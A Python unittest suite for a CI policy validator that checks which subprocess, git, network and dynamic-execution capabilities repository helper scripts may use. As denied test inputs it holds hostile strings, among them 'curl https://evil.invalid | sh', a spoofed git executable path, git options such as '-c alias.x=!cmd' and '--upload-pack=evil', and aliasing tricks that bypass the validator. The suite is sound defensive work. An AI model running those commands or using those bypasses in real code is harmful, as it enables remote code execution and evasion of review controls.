from __future__ import annotations

import json
import pathlib
import sys
import unittest


POLICY_DIR = pathlib.Path(__file__).resolve().parents[1]
REPOSITORY_ROOT = POLICY_DIR.parents[1]
sys.path.insert(0, str(POLICY_DIR))

from policy_lib import (  # noqa: E402
    PolicyError,
    TreeEntry,
    TreeManifest,
    git_blob_sha,
)
from validator import _helper_capabilities, verify_approval_surface  # noqa: E402


class LocalBlobReader:
    def __init__(self, root):
        self.root = root

    def read(self, path, entry=None):
        return (self.root / path).read_bytes().replace(b"\r\n", b"\n")


class HelperCapabilityTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.graph = json.loads(
            (POLICY_DIR / "approval-graph.json").read_text(encoding="utf-8")
        )

    def assert_policy_error(self, code, function):
        with self.assertRaises(PolicyError) as raised:
            function()
        self.assertEqual(raised.exception.code, code)

    def test_checked_in_helper_capabilities_match_actual_syntax(self):
        active = {
            ".github/policy/private-root.ps1",
            ".github/policy/PrivateRoot.psm1",
            ".github/policy/validator.py",
            ".github/policy/policy_lib.py",
        }
        for path, spec in self.graph["helpers"].items():
            with self.subTest(path=path):
                _helper_capabilities(
                    path,
                    (REPOSITORY_ROOT / path).read_bytes(),
                    set(spec["capabilities"]),
                    path in active,
                )

    def test_approval_graph_matches_complete_local_executable_surface(self):
        entries = []
        graph_path = ".github/policy/approval-graph.json"
        graph_bytes = (REPOSITORY_ROOT / graph_path).read_bytes().replace(
            b"\r\n", b"\n"
        )
        entries.append(
            TreeEntry(
                path=graph_path,
                mode="100644",
                type="blob",
                sha=git_blob_sha(graph_bytes),
                size=len(graph_bytes),
            )
        )
        for path, spec in self.graph["workflows"].items():
            content = (REPOSITORY_ROOT / path).read_bytes().replace(
                b"\r\n", b"\n"
            )
            self.assertEqual(git_blob_sha(content), spec["blob"])
            entries.append(
                TreeEntry(
                    path=path,
                    mode="100644",
                    type="blob",
                    sha=git_blob_sha(content),
                    size=len(content),
                )
            )
        for path, spec in self.graph["helpers"].items():
            content = (REPOSITORY_ROOT / path).read_bytes().replace(
                b"\r\n", b"\n"
            )
            self.assertEqual(git_blob_sha(content), spec["blob"])
            entries.append(
                TreeEntry(
                    path=path,
                    mode=spec["mode"],
                    type="blob",
                    sha=git_blob_sha(content),
                    size=len(content),
                )
            )
        manifest = TreeManifest("a" * 40, entries)
        reader = LocalBlobReader(REPOSITORY_ROOT)
        verify_approval_surface(
            self.graph,
            manifest,
            manifest,
            reader,
            reader,
            git_blob_sha(graph_bytes),
        )

    def test_active_python_dynamic_execution_denies(self):
        for invocation in (
            "eval(candidate)",
            "exec(candidate)",
            "__import__(candidate)",
            "import os\nos.system(candidate)",
        ):
            with self.subTest(invocation=invocation):
                self.assert_policy_error(
                    "HELPER_DYNAMIC_EXECUTION",
                    lambda invocation=invocation: _helper_capabilities(
                        "helper.py",
                        invocation.encode(),
                        set(),
                        True,
                    ),
                )

    def test_active_python_constructed_or_non_git_subprocess_denies(self):
        cases = (
            "import subprocess\nsubprocess.run(command)",
            "import subprocess\nsubprocess.run(['curl', 'https://evil.invalid'])",
            "import subprocess\nsubprocess.run(['git', 'status'], shell=True)",
        )
        for source in cases:
            with self.subTest(source=source):
                with self.assertRaises(PolicyError):
                    _helper_capabilities(
                        "helper.py",
                        source.encode(),
                        {"git-read-local"},
                        True,
                    )

    def test_active_git_wrapper_only_accepts_read_only_subcommands(self):
        safe = "def check(path):\n    return _run_git(path, 'status')\n"
        _helper_capabilities("helper.py", safe.encode(), set(), True)
        unsafe = "def check(path):\n    return _run_git(path, 'fetch')\n"
        self.assert_policy_error(
            "HELPER_GIT_UNMODELED",
            lambda: _helper_capabilities(
                "helper.py", unsafe.encode(), {"git-read-local"}, True
            ),
        )

    def test_network_import_requires_explicit_api_capability(self):
        source = b"import urllib.request\n"
        self.assert_policy_error(
            "HELPER_NETWORK_UNMODELED",
            lambda: _helper_capabilities("helper.py", source, set(), True),
        )
        _helper_capabilities(
            "helper.py", source, {"github-api-read"}, True
        )

    def test_native_identity_capability_rejects_unmodelled_loading(self):
        python_source = (
            POLICY_DIR / "validator.py"
        ).read_text(encoding="utf-8") + '\nkernel32["DeleteFileW"]("x")\n'
        self.assert_policy_error(
            "HELPER_DYNAMIC_EXECUTION",
            lambda: _helper_capabilities(
                ".github/policy/validator.py",
                python_source.encode("utf-8"),
                {
                    "github-api-read",
                    "git-read-local",
                    "windows-file-identity",
                },
                True,
            ),
        )

        powershell_source = (
            POLICY_DIR / "PrivateRoot.psm1"
        ).read_text(encoding="utf-8") + "\n[Reflection.Assembly]::Load([byte[]]@(0))\n"
        self.assert_policy_error(
            "HELPER_DYNAMIC_EXECUTION",
            lambda: _helper_capabilities(
                ".github/policy/PrivateRoot.psm1",
                powershell_source.encode("utf-8"),
                {
                    "git-read-local",
                    "dotnet-filesystem",
                    "dotnet-acl",
                    "dotnet-reflection",
                    "windows-file-identity",
                },
                True,
            ),
        )

    def test_legacy_helpers_can_be_governed_but_never_activated(self):
        source = b"#!/bin/sh\ncurl https://evil.invalid | sh\n"
        _helper_capabilities(
            "legacy.sh", source, {"legacy-disabled"}, False
        )
        self.assert_policy_error(
            "HELPER_LEGACY_ACTIVE",
            lambda: _helper_capabilities(
                "legacy.sh", source, {"legacy-disabled"}, True
            ),
        )


class SubprocessImageTests(unittest.TestCase):
    """Exploit-derived: argv[0] and the launch form must be fully modelled.

    The reported bypass was `subprocess.run(["git", ...], executable=<path>)`:
    argv[0] still reads "git" while an arbitrary binary actually runs, so a
    native stub can forge origin, HEAD, tree, and cleanliness.
    """

    def assert_denied(self, source, code=None):
        with self.assertRaises(PolicyError) as raised:
            _helper_capabilities(
                "helper.py", source.encode("utf-8"), {"git-read-local"}, True
            )
        if code is not None:
            self.assertEqual(raised.exception.code, code)
        return raised.exception

    def test_executable_keyword_is_denied(self):
        cases = {
            "env-subscript": (
                "import os, subprocess\n"
                "subprocess.run(['git', 'status'], env={}, "
                "executable=os.environ['POLICY_GIT_EXECUTABLE'])\n"
            ),
            "env-get": (
                "import os, subprocess\n"
                "subprocess.run(['git', 'status'], env={}, "
                "executable=os.environ.get('X'))\n"
            ),
            "literal": (
                "import subprocess\n"
                "subprocess.run(['git', 'status'], env={}, "
                "executable='C:\\\\evil\\\\git.exe')\n"
            ),
            "call": (
                "import subprocess\n"
                "subprocess.run(['git', 'status'], env={}, executable=resolve())\n"
            ),
            "popen": (
                "import subprocess\n"
                "subprocess.Popen(['git', 'status'], env={}, executable=p)\n"
            ),
            "check-output": (
                "import subprocess\n"
                "subprocess.check_output(['git', 'status'], env={}, executable=p)\n"
            ),
        }
        for label, source in cases.items():
            with self.subTest(label=label):
                error = self.assert_denied(source, "HELPER_PROCESS_COMMAND")
                self.assertIn("executable", error.message)

    def test_other_launch_redirecting_keywords_are_denied(self):
        for keyword in (
            "preexec_fn=f",
            "start_new_session=True",
            "creationflags=8",
            "startupinfo=si",
            "pass_fds=(3,)",
            "user='root'",
        ):
            source = (
                "import subprocess\n"
                f"subprocess.run(['git', 'status'], env={{}}, {keyword})\n"
            )
            with self.subTest(keyword=keyword):
                self.assert_denied(source, "HELPER_PROCESS_COMMAND")

    def test_nonliteral_argv0_is_denied(self):
        cases = {
            "env-subscript": (
                "import os, subprocess\n"
                "subprocess.run([os.environ['G'], 'status'], env={})\n"
            ),
            "name": "import subprocess\nsubprocess.run([image, 'status'], env={})\n",
            "attribute": (
                "import subprocess\nsubprocess.run([mod.image, 'status'], env={})\n"
            ),
            "unlisted-call": (
                "import subprocess\nsubprocess.run([resolve(), 'status'], env={})\n"
            ),
            "resolver-with-args": (
                "import subprocess\n"
                "subprocess.run([_git_image('x'), 'status'], env={})\n"
            ),
            "fstring": (
                "import subprocess\n"
                "subprocess.run([f'{root}/git', 'status'], env={})\n"
            ),
            "concat": (
                "import subprocess\n"
                "subprocess.run([root + '/git', 'status'], env={})\n"
            ),
        }
        for label, source in cases.items():
            with self.subTest(label=label):
                self.assert_denied(source, "HELPER_PROCESS_COMMAND")

    def test_wrappers_and_aliases_are_denied(self):
        # The alias must still be recognised as a subprocess entry point, so the
        # same argv[0] and keyword rules apply through it.
        cases = {
            "from-import": (
                "from subprocess import run\n"
                "run(['git', 'status'], env={}, executable=p)\n"
            ),
            "aliased": (
                "from subprocess import run as go\n"
                "go(['git', 'status'], env={}, executable=p)\n"
            ),
            "from-import-nonliteral": (
                "from subprocess import run\nrun([image, 'status'], env={})\n"
            ),
            "module-alias": (
                "import subprocess as sp\nsp.run([x], env={})\n"
            ),
            "popen-alias": (
                "from subprocess import Popen as P\n"
                "P(['git', 'status'], env={}, executable=p)\n"
            ),
            "os-system": "import os\nos.system('git status')\n",
            "os-popen": "import os\nos.popen('git status')\n",
            "from-os-system": "from os import system\nsystem('git status')\n",
            "runpy": "import runpy\nrunpy.run_path('x')\n",
            "kwargs-splat": (
                "import subprocess\nsubprocess.run(['git', 'status'], **opts)\n"
            ),
        }
        for label, source in cases.items():
            with self.subTest(label=label):
                with self.assertRaises(PolicyError):
                    _helper_capabilities(
                        "helper.py",
                        source.encode("utf-8"),
                        {"git-read-local"},
                        True,
                    )

    def test_splatted_arguments_are_denied(self):
        cases = {
            "tail-splat": (
                "import subprocess\nsubprocess.run(['git', *args], env={})\n"
            ),
            "middle-splat": (
                "import subprocess\n"
                "subprocess.run(['git', '-C', *rest, 'status'], env={})\n"
            ),
            "argv0-splat": (
                "import subprocess\nsubprocess.run([*argv], env={})\n"
            ),
            "trusted-image-then-splat": (
                "import subprocess\n"
                "def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
                "subprocess.run([_git_image(), *args], env={})\n"
            ),
        }
        for label, source in cases.items():
            with self.subTest(label=label):
                error = self.assert_denied(source, "HELPER_PROCESS_COMMAND")
                self.assertIn("splat", error.message)

    def test_empty_command_is_denied(self):
        self.assert_denied(
            "import subprocess\nsubprocess.run([], env={})\n",
            "HELPER_PROCESS_COMMAND",
        )

    def test_the_actual_trusted_call_is_classified_exactly(self):
        source = (
            "import subprocess\n"
            "def _git_image():\n"
            "    return 'C:/Program Files/Git/cmd/git.exe'\n"
            "def _git_environment():\n"
            "    return {}\n"
            "def run(checkout):\n"
            "    return subprocess.run(\n"
            "        [_git_image(), '-C', str(checkout), 'status', '-s', '-uall'],\n"
            "        env=_git_environment(),\n"
            "        shell=False,\n"
            "    )\n"
        )
        _helper_capabilities(
            "helper.py", source.encode("utf-8"), {"git-read-local"}, True
        )

    def test_literal_git_argv0_remains_acceptable(self):
        source = (
            "import subprocess\n"
            "subprocess.run(['git', 'status'], env={}, shell=False)\n"
        )
        _helper_capabilities(
            "helper.py", source.encode("utf-8"), {"git-read-local"}, True
        )

    def test_dangerous_subcommand_still_denied_with_trusted_image(self):
        source = (
            "import subprocess\n"
            "def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
            "subprocess.run([_git_image(), 'clone', 'x'], env={})\n"
        )
        self.assert_denied(source, "HELPER_GIT_UNMODELED")

    def test_ambient_environment_is_still_denied(self):
        source = (
            "import os, subprocess\n"
            "def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
            "subprocess.run([_git_image(), 'status'], env=os.environ)\n"
        )
        self.assert_denied(source, "HELPER_PROCESS_COMMAND")

    def test_missing_environment_is_still_denied(self):
        source = (
            "import subprocess\n"
            "def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
            "subprocess.run([_git_image(), 'status'])\n"
        )
        self.assert_denied(source, "HELPER_PROCESS_COMMAND")

    def test_production_validator_passes_its_own_rule(self):
        source = (POLICY_DIR / "validator.py").read_bytes()
        _helper_capabilities(
            ".github/policy/validator.py",
            source,
            {"github-api-read", "git-read-local", "windows-file-identity"},
            True,
        )


class ResolverBindingTests(unittest.TestCase):
    """C-1: the trusted resolver is checked by binding, never by spelling."""

    def assert_denied(self, source):
        with self.assertRaises(PolicyError) as raised:
            _helper_capabilities(
                "helper.py", source.encode("utf-8"), {"git-read-local"}, True
            )
        return raised.exception

    def launch(self, prelude):
        return (
            "import subprocess\n"
            + prelude
            + "subprocess.run([_git_image(), 'status'], env={})\n"
        )

    def test_shadowed_resolver_bindings_are_denied(self):
        cases = {
            "env-return": "def _git_image():\n    return os.environ['G']\n",
            "attacker-literal": "def _git_image():\n    return 'C:/evil/git.exe'\n",
            "argv-return": (
                "import sys\ndef _git_image():\n    return sys.argv[1]\n"
            ),
            "attribute-return": "def _git_image():\n    return mod.path\n",
            "file-return": (
                "def _git_image():\n    return open('x').read()\n"
            ),
            "lambda": "_git_image = lambda: 'C:/evil/git.exe'\n",
            "assignment": "def real():\n    return 'x'\n_git_image = real\n",
            "duplicate-def": (
                "def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
                "def _git_image():\n    return 'C:/evil/git.exe'\n"
            ),
            "conditional-def": (
                "if flag:\n    def _git_image():\n        return 'C:/Program Files/Git/cmd/git.exe'\n"
                "else:\n    def _git_image():\n        return 'C:/evil/git.exe'\n"
            ),
            "rebind-after": (
                "def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
                "_git_image = other\n"
            ),
            "nested-def": (
                "def outer():\n    def _git_image():\n        return 'C:/Program Files/Git/cmd/git.exe'\n"
                "    return _git_image\n"
            ),
            "decorated": (
                "def deco(f):\n    return f\n"
                "@deco\ndef _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
            ),
            "async-def": (
                "async def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
            ),
            "parameters": (
                "def _git_image(which='C:/Program Files/Git/cmd/git.exe'):\n    return which\n"
            ),
            "global-decl": (
                "def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
                "def poke():\n    global _git_image\n"
            ),
            "try-finally": (
                "def _git_image():\n    try:\n        return evil()\n"
                "    finally:\n        pass\n"
            ),
            "undefined": "",
        }
        for label, prelude in cases.items():
            with self.subTest(label=label):
                self.assert_denied(self.launch(prelude))

    def test_resolver_returning_a_trusted_image_is_accepted(self):
        source = self.launch("def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n")
        _helper_capabilities(
            "helper.py", source.encode("utf-8"), {"git-read-local"}, True
        )


class LauncherIndirectionTests(unittest.TestCase):
    """C-2: a process launcher must not be reachable through indirection."""

    def assert_denied(self, source):
        with self.assertRaises(PolicyError) as raised:
            _helper_capabilities(
                "helper.py", source.encode("utf-8"), {"git-read-local"}, True
            )
        return raised.exception

    def test_indirect_launch_forms_are_denied(self):
        cases = {
            "assign-run": (
                "import os, subprocess\nf = subprocess.run\n"
                "f([os.environ['ANY'], 'clone', 'https://evil'], env=os.environ,"
                " executable=os.environ['E'], shell=True)\n"
            ),
            "module-alias": (
                "import subprocess as sp\nsp.run(['git', 'clone', 'x'], env={})\n"
            ),
            "shim-alias": (
                "from attacker import shim as subprocess\n"
                "subprocess.run(['git', 'clone', 'x'], env={})\n"
            ),
            "functools-partial": (
                "import functools, subprocess\n"
                "go = functools.partial(subprocess.run)\ngo(['git'], env={})\n"
            ),
            "dict-dispatch": (
                "import subprocess\ntable = {'r': subprocess.run}\n"
                "table['r'](['git'], env={})\n"
            ),
            "subclass-popen": (
                "import subprocess\nclass P(subprocess.Popen):\n    pass\n"
                "P(['git'], env={})\n"
            ),
            "attribute-reference": (
                "import subprocess\nref = subprocess.Popen\nref(['git'], env={})\n"
            ),
            "os-system-alias": "from os import system as s\ns('git clone x')\n",
            "star-import": "from subprocess import *\nrun(['git'], env={})\n",
            "from-import-run": (
                "from subprocess import run\nrun(['git'], env={})\n"
            ),
        }
        for label, source in cases.items():
            with self.subTest(label=label):
                self.assert_denied(source)

    def test_module_alias_is_denied_even_without_a_call(self):
        # Isolates the alias guard: the declared capability matches the surface,
        # so neither the dormant nor the undeclared check can mask it.
        with self.assertRaises(PolicyError) as raised:
            _helper_capabilities(
                "helper.py",
                b"import subprocess as sp\nvalue = 1\n",
                {"git-read-local"},
                True,
            )
        self.assertIn("alias", raised.exception.message)

    def test_star_import_from_any_module_is_denied(self):
        with self.assertRaises(PolicyError) as raised:
            _helper_capabilities(
                "helper.py", b"from json import *\nvalue = 1\n", set(), True
            )
        self.assertIn("star import", raised.exception.message)

    def test_conflicting_rebinding_is_denied(self):
        with self.assertRaises(PolicyError) as raised:
            _helper_capabilities(
                "helper.py", b"import json\ndef json():\n    return 1\n", set(), True
            )
        self.assertIn("rebinds", raised.exception.message)

    def test_unresolvable_argv_expression_is_denied(self):
        # The module contains an assignment, so the argv resolution genuinely
        # has to decide rather than falling through an empty search.
        with self.assertRaises(PolicyError) as raised:
            _helper_capabilities(
                "helper.py",
                b"import subprocess\n"
                b"marker = 1\n"
                b"def build():\n    return ['git', 'clone']\n"
                b"def go():\n    return subprocess.run(build(), env={})\n",
                {"git-read-local"},
                True,
            )
        self.assertEqual(raised.exception.code, "HELPER_PROCESS_COMMAND")
        self.assertIn("constructed subprocess command", raised.exception.message)

    def test_non_git_literal_image_is_denied(self):
        self.assert_denied(
            "import subprocess\nsubprocess.run(['notgit', 'status'], env={})\n"
        )

    def test_keyword_splat_is_denied_even_with_an_environment(self):
        self.assert_denied(
            "import subprocess\n"
            "subprocess.run(['git', 'status'], env={}, **opts)\n"
        )

    def test_launch_without_arguments_is_denied(self):
        self.assert_denied("import subprocess\nsubprocess.run()\n")


class LaunchSubstanceTests(unittest.TestCase):
    """H-4: guards must check substance, not shape."""

    TRUSTED = (
        "import subprocess\n"
        "def _git_image():\n    return 'C:/Program Files/Git/cmd/git.exe'\n"
        "def _git_environment():\n    return {}\n"
    )

    def assert_denied(self, body, code=None):
        source = self.TRUSTED + body
        with self.assertRaises(PolicyError) as raised:
            _helper_capabilities(
                "helper.py", source.encode("utf-8"), {"git-read-local"}, True
            )
        if code is not None:
            self.assertEqual(raised.exception.code, code)

    def test_ambient_environment_forms_are_denied(self):
        for label, body in {
            "from-import": (
                "from os import environ\nenv = environ\n"
                "subprocess.run([_git_image(), 'status'], env=env)\n"
            ),
            "dict-copy": (
                "import os\n"
                "subprocess.run([_git_image(), 'status'], env=dict(os.environ))\n"
            ),
            "indirect": (
                "import os\nAMB = os.environ\n"
                "subprocess.run([_git_image(), 'status'], env=AMB)\n"
            ),
        }.items():
            with self.subTest(label=label):
                self.assert_denied(body, "HELPER_PROCESS_COMMAND")

    def test_shell_must_be_literal_false(self):
        for value in ("1", "flag", "True", "bool(0)"):
            with self.subTest(value=value):
                self.assert_denied(
                    f"subprocess.run([_git_image(), 'status'], env={{}}, shell={value})\n",
                    "HELPER_PROCESS_SHELL",
                )

    def test_cwd_must_be_literal(self):
        self.assert_denied(
            "import os\n"
            "subprocess.run([_git_image(), 'status'], env={}, cwd=os.environ['X'])\n",
            "HELPER_PROCESS_COMMAND",
        )

    def test_nonliteral_operands_cannot_smuggle_a_subcommand(self):
        for body in (
            "subprocess.run([_git_image(), sub, 'x'], env={})\n",
            "subprocess.run([_git_image(), 'cl' + 'one'], env={})\n",
            "subprocess.run([_git_image(), f'{x}'], env={})\n",
        ):
            with self.subTest(body=body.strip()):
                self.assert_denied(body, "HELPER_PROCESS_COMMAND")

    def test_git_global_options_are_modelled(self):
        for option in (
            "'-c', 'alias.x=!cmd'",
            "'--exec-path=C:/evil'",
            "'--upload-pack=evil'",
            "'--receive-pack=evil'",
            "'--git-dir=C:/evil'",
            "'--work-tree=C:/evil'",
            "'--namespace=x'",
        ):
            with self.subTest(option=option):
                self.assert_denied(
                    f"subprocess.run([_git_image(), {option}, 'status'], env={{}})\n",
                    "HELPER_GIT_UNMODELED",
                )


if __name__ == "__main__":
    unittest.main()
